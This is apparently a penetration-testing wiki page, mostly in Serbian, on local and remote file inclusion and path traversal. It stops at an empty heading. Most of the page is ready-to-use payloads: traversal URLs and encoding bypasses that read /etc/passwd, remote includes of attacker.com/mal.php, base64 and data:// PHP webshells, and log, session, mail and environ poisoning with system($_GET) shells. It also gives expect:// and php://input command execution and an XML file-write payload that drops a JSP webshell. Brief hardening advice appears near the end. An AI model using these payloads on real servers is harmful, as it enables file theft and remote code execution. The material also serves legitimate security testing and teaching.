# File Inclusion/Path traversal

{{#include ../../banners/hacktricks-training.md}}

## File Inclusion

**Remote File Inclusion (RFI):** Fajl se učitava sa udaljenog servera (Najbolje: Možete napisati kod i server će ga izvršiti). U php ovo je **onemogućeno** po defaultu (**allow_url_include**).\
**Local File Inclusion (LFI):** Server učitava lokalni fajl.

Ranljivost nastaje kada korisnik na neki način može kontrolisati fajl koji će server učitati.

Ranljive **PHP functions**: require, require_once, include, include_once

Interesantan alat za eksploatisanje ove ranljivosti: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Blind - Interesting - LFI2RCE files
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**Mešanjem nekoliko \*nix LFI lista i dodavanjem još putanja napravio sam ovu:**


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt
{{#endref}}

Probajte takođe da zamenite `/` sa `\`\
Probajte takođe da dodate `../../../../../`

Lista koja koristi nekoliko tehnika da pronađe fajl /etc/password (da bi se proverilo da li ranjivost postoji) može se naći [ovde](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

Spajanje različitih wordlists:


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
{{#endref}}

Probajte takođe da zamenite `/` sa `\`\
Probajte takođe da uklonite `C:/` i dodate `../../../../../`

Lista koja koristi više tehnika da pronađe fajl /boot.ini (da bi se proverilo da li ranjivost postoji) može se naći [ovde](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

Proverite LFI listu za linux.

## Osnovni LFI i zaobilaženja

Svi primeri su za Local File Inclusion ali se mogu primeniti i na Remote File Inclusion takođe (page=[http://myserver.com/phpshellcode.txt\\](<http://myserver.com/phpshellcode.txt)/>).
```
http://example.com/index.php?page=../../../etc/passwd
```
### traversal sequences uklonjene nerekurzivno
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypass ubacivanja dodatnih karaktera na kraj prosleđenog stringa (bypass of: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
Ovo je **rešeno od PHP 5.4**

### **Kodiranje**

Možete koristiti nestandardna kodiranja poput double URL encode (i drugih):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Iz postojeće fascikle

Možda back-end proverava putanju fascikle:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Istraživanje direktorijuma sistema fajlova na serveru

Sistem fajlova na serveru može se rekurzivno istražiti kako bi se identifikovali direktorijumi, ne samo fajlovi, koristeći određene tehnike. Ovaj proces uključuje određivanje dubine direktorijuma i ispitivanje postojanja određenih direktorijuma. Ispod je detaljna metoda za postizanje ovog cilja:

1. **Odredite dubinu direktorijuma:** Utvrdite dubinu vašeg trenutnog direktorijuma tako što ćete uspešno dohvatiti `/etc/passwd` fajl (primenljivo ako je server zasnovan na Linuxu). Primer URL-a može biti strukturiran na sledeći način, ukazujući na dubinu tri:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Probe for Folders:** Dodajte ime sumnjive fascikle (npr. `private`) u URL, zatim se vratite na `/etc/passwd`. Dodatni nivo direktorijuma zahteva povećanje dubine za jedan:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Tumačenje rezultata:** Odgovor servera pokazuje da li direktorijum postoji:
- **Greška / Nema izlaza:** Direktorijum `private` verovatno ne postoji na navedenoj lokaciji.
- **Sadržaj `/etc/passwd`:** Prisutnost direktorijuma `private` je potvrđena.
4. **Rekurzivno istraživanje:** Otkrivene direktorijume je moguće dalje ispitivati radi poddirektorijuma ili fajlova koristeći istu tehniku ili tradicionalne Local File Inclusion (LFI) metode.

Za istraživanje direktorijuma na različitim lokacijama u fajl sistemu, prilagodite payload u skladu s tim. Na primer, da proverite da li `/var/www/` sadrži direktorijum `private` (pretpostavljajući da je trenutni direktorijum na dubini 3), koristite:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Path Truncation Technique**

Path truncation je metoda koja se koristi za manipulaciju putanjama fajlova u web aplikacijama. Često se koristi za pristup zaštićenim fajlovima zaobilaženjem određenih sigurnosnih mera koje dodaju dodatne karaktere na kraj putanja fajlova. Cilj je kreirati putanju fajla koja, nakon što je sigurnosna mera izmeni, i dalje pokazuje na željeni fajl.

U PHP-u, različite reprezentacije putanje fajla mogu se smatrati ekvivalentnim zbog prirode fajl sistema. Na primer:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` i `/etc/passwd/` svi se tretiraju kao ista putanja.
- Kada su poslednjih 6 karaktera `passwd`, dodavanje `/` (čineći ga `passwd/`) ne menja ciljani fajl.
- Slično, ako je `.php` dodat putanji fajla (npr. `shellcode.php`), dodavanje `/.` na kraju neće promeniti fajl kojem se pristupa.

Priloženi primeri pokazuju kako iskoristiti path truncation za pristup `/etc/passwd`, česta meta zbog svog osetljivog sadržaja (informacije o korisničkim nalozima):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
U ovim scenarijima, broj traversals potrebnih može biti oko 2027, ali taj broj može varirati u zavisnosti od konfiguracije servera.

- **Using Dot Segments and Additional Characters**: Traversal sequences (`../`) u kombinaciji sa dodatnim dot segments i karakterima mogu se koristiti za navigaciju fajl sistemom, efikasno ignorišući stringove koje server prikači.
- **Determining the Required Number of Traversals**: Metodom pokušaja i greške može se pronaći tačan broj `../` sekvenci potreban da se dođe do root directory i zatim do `/etc/passwd`, pri čemu se vodi računa da prikačeni stringovi (kao `.php`) budu neutralisani, dok željeni put (`/etc/passwd`) ostane netaknut.
- **Starting with a Fake Directory**: Uobičajena praksa je započeti put nepostojećim direktorijumom (npr. `a/`). Ova tehnika se koristi kao mera predostrožnosti ili da bi se ispunili zahtevi serverove logike parsiranja putanja.

When employing path truncation techniques, ključno je razumeti ponašanje servera pri parsiranju putanja i strukturu fajl sistema. Svaki scenario može zahtevati drugačiji pristup, i često je neophodno testiranje da bi se našla najučinkovitija metoda.

**This vulnerability was corrected in PHP 5.3.**

### **Filter bypass tricks**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Remote File Inclusion

U php-u je ovo onemogućeno po podrazumevanoj postavci zato što je **`allow_url_include`** **Off.** Mora biti **On** da bi radilo, i u tom slučaju možete uključiti PHP fajl sa vašeg servera i dobiti RCE:
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
Ako iz nekog razloga **`allow_url_include`** ima vrednost **On**, ali PHP **filtrira** pristup eksternim veb-stranicama, [according to this post](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), možete, na primer, koristiti data protocol sa base64 da dekodirate b64 PHP code i dobijete RCE:
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
> [!TIP]
> U prethodnom kodu, završni `+.txt` je dodat zato što je attacker trebao string koji se završava sa `.txt`, tako da se string završava njime i nakon b64 decode-a taj deo će vratiti samo junk i pravi PHP kod će biti uključen (i stoga, izvršen).

Još jedan primer **koji ne koristi `php://` protokol** bio bi:
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
## Python korenski element

U Pythonu u kodu poput ovog:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
Ako korisnik prosledi **apsolutnu putanju** u **`file_name`**, **prethodna putanja se jednostavno uklanja**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
Ovo je predviđeno ponašanje prema [the docs](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> Ako je komponenta apsolutna putanja, sve prethodne komponente se odbacuju i spajanje se nastavlja od te apsolutne komponente.

## Java: prikaz direktorijuma

Čini se da ako imate Path Traversal u Java i **zatražite direktorijum** umesto fajla, **vraća se listing direktorijuma**. Ovo se, koliko mi je poznato, neće dešavati u drugim jezicima.

## Top 25 parametara

Evo liste top 25 parametara koji bi mogli biti podložni local file inclusion (LFI) ranjivostima (iz [link](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI koristeći PHP wrappers & protocols

### php://filter

PHP filteri omogućavaju izvođenje osnovnih **operacija izmene nad podacima** pre nego što se oni pročitaju ili upišu. Postoji 5 kategorija filtera:

- [String Filters](https://www.php.net/manual/en/filters.string.php):
- `string.rot13`
- `string.toupper`
- `string.tolower`
- `string.strip_tags`: Uklanja tagove iz podataka (sve između znakova "<" i ">")
- Note that this filter has disappear from the modern versions of PHP
- [Conversion Filters](https://www.php.net/manual/en/filters.convert.php)
- `convert.base64-encode`
- `convert.base64-decode`
- `convert.quoted-printable-encode`
- `convert.quoted-printable-decode`
- `convert.iconv.*` : Pretvara u drugo kodiranje (`convert.iconv.<input_enc>.<output_enc>`). Da biste dobili **listu svih kodiranja** koja su podržana pokrenite u konzoli: `iconv -l`

> [!WARNING]
> Abusing the `convert.iconv.*` conversion filter you can **generate arbitrary text**, which could be useful to write arbitrary text or make a function like include process arbitrary text. For more info check [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).

- [Compression Filters](https://www.php.net/manual/en/filters.compression.php)
- `zlib.deflate`: Komprimuje sadržaj (korisno ako eksfiltrirate mnogo informacija)
- `zlib.inflate`: Dekompresuje podatke
- [Encryption Filters](https://www.php.net/manual/en/filters.encryption.php)
- `mcrypt.*` : Deprecated
- `mdecrypt.*` : Deprecated
- Ostali filteri
- Ako u PHP-u pokrenete `var_dump(stream_get_filters());` možete naći nekoliko **neočekivanih filtera**:
- `consumed`
- `dechunk`: reverses HTTP chunked encoding
- `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
> [!WARNING]
> Deo "php://filter" nije osetljiv na veličinu slova

### Korišćenje php filtera kao orakla za čitanje proizvoljnih fajlova

[**U ovom postu**](https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle) je predložena tehnika za čitanje lokalnog fajla bez dobijanja izlaza nazad od servera. Ova tehnika se zasniva na **boolean exfiltration fajla (karakter po karakter) koristeći php filtere** kao orakl. To je zato što se php filteri mogu koristiti da tekst učine dovoljno velikim da php baci izuzetak.

U originalnom postu možete naći detaljno objašnjenje tehnike, ali ovde je kratak rezime:

- Use the codec **`UCS-4LE`** to leave leading character of the text at the begging and make the size of string increases exponentially.
- Ovo će biti iskorišćeno da se generiše **tekst toliko velik da, kada je početno slovo pogođeno**, php izazove **grešku**
- Filter **dechunk** će **ukloniti sve ako prvi karakter nije heksadecimalan**, pa možemo znati da li je prvi karakter hex.
- Ovo, u kombinaciji sa prethodnim (i drugim filterima u zavisnosti od pogađanog slova), omogućiće nam da pogodimo slovo na početku teksta posmatrajući kada uradimo dovoljno transformacija da ono prestane biti heksadecimalni karakter. Jer ako je hex, dechunk ga neće obrisati i početna bomba će izazvati php grešku.
- The codec **convert.iconv.UNICODE.CP930** transforms every letter in the following one (so after this codec: a -> b). This allow us to discovered if the first letter is an `a` for example because if we apply 6 of this codec a->b->c->d->e->f->g the letter isn't anymore a hexadecimal character, therefore dechunk doesn't deleted it and the php error is triggered because it multiplies with the initial bomb.
- Korišćenjem drugih transformacija kao što je **rot13** na početku moguće je leak-ovati druge chars kao n, o, p, q, r (i drugi codecs se mogu koristiti da pomere druga slova u hex opseg).
- Kada je početni karakter broj, potrebno je base64 enkodovati i leak-ovati prva 2 slova da bi se otkrio broj.
- The final problem is to see **how to leak more than the initial letter**. By using order memory filters like **convert.iconv.UTF16.UTF-16BE, convert.iconv.UCS-4.UCS-4LE, convert.iconv.UCS-4.UCS-4LE** is possible to change the order of the chars and get in the first position other letters of the text.
- I u cilju dobijanja **further data** ideja je da **generišemo 2 bajta junk podataka na početku** sa **convert.iconv.UTF16.UTF16**, primenimo **UCS-4LE** da ih **pivotujemo sa naredna 2 bajta**, i d**eleti podatke sve do junk podataka** (ovo će ukloniti prva 2 bajta početnog teksta). Nastavite ovo dok ne dođete do željenog bita za leak.

U postu je takođe objavljen alat za automatsko izvođenje: [php_filters_chain_oracle_exploit](https://github.com/synacktiv/php_filter_chains_oracle_exploit).

### php://fd

Ovaj wrapper omogućava pristup file descriptor-ima koje proces ima otvorene. Potencijalno korisno za izvlačenje sadržaja otvorenih fajlova:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
Takođe možete koristiti **php://stdin, php://stdout and php://stderr** da pristupite **file descriptors 0, 1 and 2** redom (nisam siguran kako bi ovo moglo biti korisno u attacku)

### zip:// and rar://

Otpremite Zip ili Rar fajl sa PHPShell unutra i pristupite mu.\
Da bi bilo moguće zloupotrebiti rar protocol, on **mora biti posebno aktiviran**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
Imajte na umu da je ovaj protokol ograničen php konfiguracijama **`allow_url_open`** i **`allow_url_include`**

### expect://

Expect mora biti aktiviran. Možete izvršavati kod koristeći ovo:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

Navedite svoj payload u POST parametrima:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Fajl `.phar` može biti iskorišćen za izvršavanje PHP koda kada veb aplikacija koristi funkcije poput `include` za učitavanje fajlova. PHP kod prikazan ispod demonstrira kreiranje `.phar` fajla:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Da biste kompajlirali fajl `.phar`, treba izvršiti sledeću komandu:
```bash
php --define phar.readonly=0 create_path.php
```
Po izvršenju biće kreirana datoteka nazvana `test.phar`, koja bi potencijalno mogla biti iskorišćena za exploatovanje Local File Inclusion (LFI) ranjivosti.

U slučajevima kada LFI samo čita datoteku bez izvršavanja PHP koda unutar nje — putem funkcija kao što su `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()`, ili `filesize()` — može se pokušati eksploatisanje deserialization ranjivosti. Ova ranjivost je povezana sa čitanjem datoteka koristeći `phar` protokol.

For a detailed understanding of exploiting deserialization vulnerabilities in the context of `.phar` files, refer to the document linked below:

[Phar Deserialization Exploitation Guide](phar-deserialization.md)


{{#ref}}
phar-deserialization.md
{{#endref}}

### CVE-2024-2961

Bilo je moguće zloupotrebiti **bilo koje proizvoljno čitanje datoteke iz PHP-a koje podržava php filters** da bi se dobio RCE. Detaljan opis može se [**naći u ovom postu**](https://www.ambionics.io/blog/iconv-cve-2024-2961-p1)**.**\
Veoma kratak rezime: iskorišćen je **3 byte overflow** u PHP heapu da bi se **izmenio lanac slobodnih chunk-ova** specifične veličine kako bi se omogućilo **pisanje bilo čega na bilo koju adresu**, pa je dodat hook koji poziva **`system`**.\
Bilo je moguće alocirati chunk-ove specifičnih veličina zloupotrebom dodatnih php filtera.

### More protocols

Pogledajte više mogućih [ **protocols to include here**](https://www.php.net/manual/en/wrappers.php)**:**

- [php://memory and php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) — zapisivanje u memoriju ili u privremenu datoteku (nije jasno koliko bi ovo moglo biti korisno u file inclusion napadu)
- [file://](https://www.php.net/manual/en/wrappers.file.php) — pristup lokalnom filesystem-u
- [http://](https://www.php.net/manual/en/wrappers.http.php) — pristup HTTP(s) URL-ovima
- [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) — pristup FTP(s) URL-ovima
- [zlib://](https://www.php.net/manual/en/wrappers.compression.php) — compression Streams
- [glob://](https://www.php.net/manual/en/wrappers.glob.php) — pronalaženje putanja koje odgovaraju obrascu (ne vraća ništa štampano, tako da nije baš korisno ovde)
- [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) — Secure Shell 2
- [ogg://](https://www.php.net/manual/en/wrappers.audio.php) — audio streams (nije korisno za čitanje proizvoljnih datoteka)

## LFI via PHP's 'assert'

Local File Inclusion (LFI) rizici u PHP-u su naročito veliki kada je u pitanju funkcija 'assert', koja može izvršavati kod unutar stringova. Ovo je posebno problematično ako se proverava ulaz koji sadrži directory traversal karaktere kao što je "..", ali nije pravilno sanitizovan.

For example, PHP code might be designed to prevent directory traversal like so:
```bash
assert("strpos('$file', '..') === false") or die("");
```
Iako ovo ima za cilj da spreči traversal, to nenamerno stvara vektor za code injection. Da bi to iskoristio za čitanje sadržaja fajla, napadač bi mogao da upotrebi:
```plaintext
' and die(highlight_file('/etc/passwd')) or '
```
Slično tome, za izvršavanje proizvoljnih sistemskih komandi, može se koristiti:
```plaintext
' and die(system("id")) or '
```
Važno je **URL-encode these payloads**.

## PHP Blind Path Traversal

> [!WARNING]
> Ova tehnika je relevantna u slučajevima kada vi **kontrolišete** **file path** neke **PHP function** koja će **access a file** ali nećete videti sadržaj fajla (kao jednostavan poziv **`file()`**) i sadržaj nije prikazan.

U [**this incredible post**](https://www.synacktiv.com/en/publications/php-filter-chains-file-read-from-error-based-oracle.html) je objašnjeno kako se blind path traversal može zloupotrebiti preko PHP filtera da bi se **exfiltrated the content of a file via an error oracle**.

Kao rezime, tehnika koristi **"UCS-4LE" encoding** da bi sadržaj fajla bio dovoljno **big** da pozivanje **PHP function** koja otvara fajl izazove **error**.

Zatim, da bi se leak-ovao prvi char koristi se filter **`dechunk`** zajedno sa drugim poput **`base64`** ili **`rot13`**, a konačno se koriste filteri **`convert.iconv.UCS-4.UCS-4LE`** i **`convert.iconv.UTF16.UTF-16BE`** da bi se **place other chars at the beggining and leak them**.

**Funkcije koje mogu biti ranjive**: `file_get_contents`, `readfile`, `finfo->file`, `getimagesize`, `md5_file`, `sha1_file`, `hash_file`, `file`, `parse_ini_file`, `copy`, `file_put_contents (only target read only with this)`, `stream_get_contents`, `fgets`, `fread`, `fgetc`, `fgetcsv`, `fpassthru`, `fputs`

Za tehničke detalje pogledajte pomenuti post!

## LFI2RCE

### Arbitrary File Write via Path Traversal (Webshell RCE)

Kada server-side kod koji prima/upload-uje fajlove gradi destinacionu putanju koristeći user-controlled podatke (npr. filename ili URL) bez canonicalisinga i validacije, `..` segmenata i absolute paths mogu pobjeći iz planiranog direktorijuma i prouzrokovati arbitrary file write. Ako možete postaviti payload pod web-exposed directory, obično dobijate unauthenticated RCE tako što postavite webshell.

Typical exploitation workflow:
- Identifikujte a write primitive u endpointu ili background workeru koji prihvata putanju/filename i zapisuje sadržaj na disk (npr. message-driven ingestion, XML/JSON command handlers, ZIP extractors, itd.).
- Odredite web-exposed directories. Uobičajeni primeri:
- Apache/PHP: `/var/www/html/`
- Tomcat/Jetty: `<tomcat>/webapps/ROOT/` → drop `shell.jsp`
- IIS: `C:\inetpub\wwwroot\` → drop `shell.aspx`
- Sastavite traversal path koji izlazi iz namenjenog storage direktorijuma u webroot, i uključite vaš webshell sadržaj.
- Otvorite preglednik na dropped payload i izvršite komande.

Napomene:
- Usluga koja vrši write može slušati na non-HTTP portu (npr. JMF XML listener na TCP 4004). Glavni web portal (na drugom portu) će kasnije servirati vaš payload.
- Na Java stackovima, ovi file writes su često implementirani jednostavnim `File`/`Paths` konkatenacijama. Nedostatak canonicalisation/allow-listing je osnovni flaw.

Generic XML/JMF-style example (product schemas vary – the DOCTYPE/body wrapper is irrelevant for the traversal):
```xml
<?xml version="1.0" encoding="UTF-8"?>
<JMF SenderID="hacktricks" Version="1.3">
<Command Type="SubmitQueueEntry">
<!-- Write outside the intake folder into the webroot via traversal -->
<Resource Name="FileName">../../../webapps/ROOT/shell.jsp</Resource>
<Data>
<![CDATA[
<%@ page import="java.io.*" %>
<%
String c = request.getParameter("cmd");
if (c != null) {
Process p = Runtime.getRuntime().exec(c);
try (var in = p.getInputStream(); var out = response.getOutputStream()) {
in.transferTo(out);
}
}
%>
]]>
</Data>
</Command>
</JMF>
```
Mere za jačanje bezbednosti koje onemogućavaju ovu klasu bagova:
- Rezolvirajte putanju u kanonsku formu i osigurajte da je potomak direktorijuma koji je na allow-listi.
- Odbacite svaku putanju koja sadrži `..`, apsolutne root-ove, ili slova drajvova; preferirajte generisane nazive fajlova.
- Pokrenite writer kao nalog sa niskim privilegijama i odvojite direktorijume za pisanje od direktorijuma koji se serviraju.

## Remote File Inclusion

Objašnjeno ranije, [**follow this link**](#remote-file-inclusion).

### Putem Apache/Nginx log fajla

Ako je Apache ili Nginx server **ranjiv na LFI** u okviru include funkcije, možete pokušati da pristupite **`/var/log/apache2/access.log` or `/var/log/nginx/access.log`**, ubacite u **user agent** ili u **GET parameter** php shell kao **`<?php system($_GET['c']); ?>`** i uključite taj fajl

> [!WARNING]
> Imajte na umu da **ako koristite double quotes** za shell umesto **simple quotes**, dvostruki navodnici će biti izmenjeni u string "_**quote;**_", **PHP će baciti grešku** i **ništa više neće biti izvršeno**.
>
> Takođe, pobrinite se da **ispravno napišete payload** ili će PHP prijavljivati grešku svaki put kada pokuša da učita log fajl i nećete imati drugu priliku.

Ovo se može uraditi i u drugim logovima ali **budite oprezni,** kod unutar logova može biti URL encoded i to može uništiti Shell. Header **authorisation "basic"** sadrži "user:password" u Base64 i on se dekodira u logovima. PHPShell se može ubaciti u ovaj header.\
Ostale moguće putanje logova:
```python
/var/log/apache2/access.log
/var/log/apache/access.log
/var/log/apache2/error.log
/var/log/apache/error.log
/usr/local/apache/log/error_log
/usr/local/apache2/log/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/httpd/error_log
```
Fuzzing wordlist: [https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI)

### Putem e-pošte

**Pošaljite mail** na interni nalog (user@localhost) koji sadrži vaš PHP payload kao `<?php echo system($_REQUEST["cmd"]); ?>` i pokušajte da include-ujete mail korisnika putem putanje kao **`/var/mail/<USERNAME>`** ili **`/var/spool/mail/<USERNAME>`**

### Putem /proc/*/fd/*

1. Otpremite mnogo shell-ova (na primer: 100)  
2. Include [http://example.com/index.php?page=/proc/$PID/fd/$FD](http://example.com/index.php?page=/proc/$PID/fd/$FD), sa $PID = PID procesa (može se brute-force-ovati) i $FD = file descriptor (takođe može da se brute-force-uje)

### Putem /proc/self/environ

Slično log fajlu, pošaljite payload u User-Agent; biće reflektovano unutar /proc/self/environ fajla
```
GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
User-Agent: <?=phpinfo(); ?>
```
### Putem upload

Ako možete upload fajl, samo inject the shell payload u njega (e.g : `<?php system($_GET['c']); ?>` ).
```
http://example.com/index.php?page=path/to/uploaded/file.png
```
Da biste fajl učinili čitljivim, najbolje je ubaciti u metapodatke slika/dokumenata/pdf

### Putem otpremanja ZIP fajla

Otpremite ZIP fajl koji sadrži kompresovani PHP shell i pristupite:
```python
example.com/page.php?file=zip://path/to/zip/hello.zip%23rce.php
```
### Putem PHP sessions

Proverite da li sajt koristi PHP Session (PHPSESSID)
```
Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
```
U PHP-u ove sesije se čuvaju u _/var/lib/php5/sess\\_\[PHPSESSID]\_ datotekama
```
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";
```
Postavite cookie na `<?php system('cat /etc/passwd');?>`
```
login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php
```
Iskoristite LFI da uključite PHP session file
```
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm2
```
### Putem ssh

Ako je ssh aktivan, proveri koji je korisnik u upotrebi (/proc/self/status & /etc/passwd) i pokušaj da pristupiš **\<HOME>/.ssh/id_rsa**

### **Putem** **vsftpd** _**logova**_

Logovi FTP servera vsftpd nalaze se na _**/var/log/vsftpd.log**_. U scenariju gde postoji Local File Inclusion (LFI) ranjivost i pristup izloženom vsftpd serveru je moguć, mogu se razmotriti sledeći koraci:

1. Ubaci PHP payload u polje za korisničko ime tokom procesa prijave.
2. Nakon injekcije, iskoristi LFI za preuzimanje server logova sa _**/var/log/vsftpd.log**_.

### Putem php base64 filter (using base64)

Kao što je prikazano u [this](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64) članku, PHP base64 filter jednostavno ignoriše Non-base64. Možeš to iskoristiti da zaobiđeš proveru ekstenzije fajla: ako dostaviš base64 koji se završava sa ".php", filter će jednostavno ignorisati "." i pripojiti "php" base64-u. Evo primera payload-a:
```url
http://example.com/index.php?page=PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.php

NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
### Putem php filters (no file needed)

This [**writeup** ](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) objašnjava da možete koristiti **php filters** da generišete proizvoljan sadržaj kao izlaz. To u suštini znači da možete **generate arbitrary php code** za include **without needing to write** ga u fajl.


{{#ref}}
lfi2rce-via-php-filters.md
{{#endref}}

### Putem segmentation fault

**Upload**-ujte fajl koji će biti privremeno smešten u `/tmp`, zatim u **istom zahtevu** izazovajte **segmentation fault**, i tada **privremeni fajl neće biti obrisan** i možete ga potražiti.


{{#ref}}
lfi2rce-via-segmentation-fault.md
{{#endref}}

### Putem Nginx temp file storage

Ako ste pronašli **Local File Inclusion** i **Nginx** radi ispred PHP-a, možda ćete moći da dobijete RCE korišćenjem sledeće tehnike:


{{#ref}}
lfi2rce-via-nginx-temp-files.md
{{#endref}}

### Putem PHP_SESSION_UPLOAD_PROGRESS

